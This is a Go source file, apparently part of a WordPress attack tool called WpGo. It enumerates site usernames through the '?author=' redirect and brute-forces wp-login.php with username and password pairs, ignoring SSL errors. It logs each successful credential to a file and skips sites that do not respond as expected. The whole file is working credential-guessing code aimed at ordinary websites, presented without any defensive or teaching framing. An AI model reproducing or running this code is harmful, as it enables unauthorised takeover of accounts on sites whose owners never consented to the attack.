package module

import (
	"fmt"
	"github.com/code-scan/Goal/Ghttp"
	"log"
	"net/http"
	"os"
	"strings"
)

type WpGo struct {
	http      Ghttp.Http
	BlackList map[string]bool
	Success   map[string]bool
}

func Write(line string) {
	lock.Lock()
	file, err := os.OpenFile(LogFile, os.O_WRONLY|os.O_CREATE|os.O_APPEND, 0666)
	if err != nil {
		log.Println(err)
	} else {
		defer file.Close()
		file.WriteString(line)
	}
	lock.Unlock()
}
func NewWpGo() *WpGo {
	w := WpGo{}
	w.http = Ghttp.Http{}
	w.BlackList = make(map[string]bool)
	w.Success = make(map[string]bool)
	return &w
}
func (w *WpGo) Login(siteTask SiteTask) {
	if w.CheckIsBlack(siteTask) {
		return
	}
	log.Println(siteTask)
	uri := fmt.Sprintf("%s/wp-login.php", siteTask.Host)
	postData := fmt.Sprintf("log=%s&pwd=%s", siteTask.User, siteTask.Pass)
	w.http.New("POST", uri)
	w.http.IgnoreSSL()
	w.http.HttpClient.CheckRedirect = func(req *http.Request, via []*http.Request) error {
		return http.ErrUseLastResponse
	}
	w.http.SetContentType("application/x-www-form-urlencoded")
	w.http.SetPostString(postData)
	//w.http.SetProxy("http://127.0.0.1:8080")
	w.http.Execute()
	cookie := w.http.RespCookie()
	if strings.Contains(cookie, "wordpress_logged_in") {
		key := fmt.Sprintf("%s|||%s", siteTask.Host, siteTask.User)
		w.Success[key] = true
		line := fmt.Sprintf("[!] Successful %s - U: %s - P: %s\n", siteTask.Host, siteTask.User, siteTask.Pass)
		log.Printf(line)
		Write(line)
	}

}
func (w *WpGo) CheckIsBlack(siteTask SiteTask) bool {
	if w.BlackList[siteTask.Host] {
		return true
	}
	key := fmt.Sprintf("%s|||%s", siteTask.Host, siteTask.User)
	if w.Success[key] {
		return true
	}
	uri := fmt.Sprintf("%s/wp-login.php", siteTask.Host)
	postData := fmt.Sprintf("log=%s&pwd=%s", siteTask.User, siteTask.Pass)
	w.http.New("POST", uri)
	w.http.IgnoreSSL()
	w.http.HttpClient.CheckRedirect = func(req *http.Request, via []*http.Request) error {
		return http.ErrUseLastResponse
	}
	w.http.SetContentType("application/x-www-form-urlencoded")
	w.http.SetPostString(postData)
	//w.http.SetProxy("http://127.0.0.1:8080")
	w.http.Execute()
	cookie := w.http.RespCookie()
	if strings.Contains(cookie, "wordpress_test_cookie") == false {
		w.BlackList[siteTask.Host] = true
		return true
	}
	w.BlackList[siteTask.Host] = false
	return false

}
func (w *WpGo) GetUser(host string, id int) string {
	uri := fmt.Sprintf("%s/?author=%d", host, id)
	w.http.New("HEAD", uri)
	w.http.IgnoreSSL()
	w.http.HttpClient.CheckRedirect = func(req *http.Request, via []*http.Request) error {
		return http.ErrUseLastResponse
	}
	w.http.Execute()
	if w.http.StatusCode() != 301 && w.http.StatusCode() != 302 {
		return ""
	}
	location := w.http.HttpResponse.Header.Get("location")
	log.Println(location)
	if location != "" {
		if user := strings.Split(location, "author/"); len(user) == 2 {
			if username := strings.Split(user[1], "/"); len(username) > 1 {
				return username[0]
			}
			return user[1]
		}
	}
	return ""
}
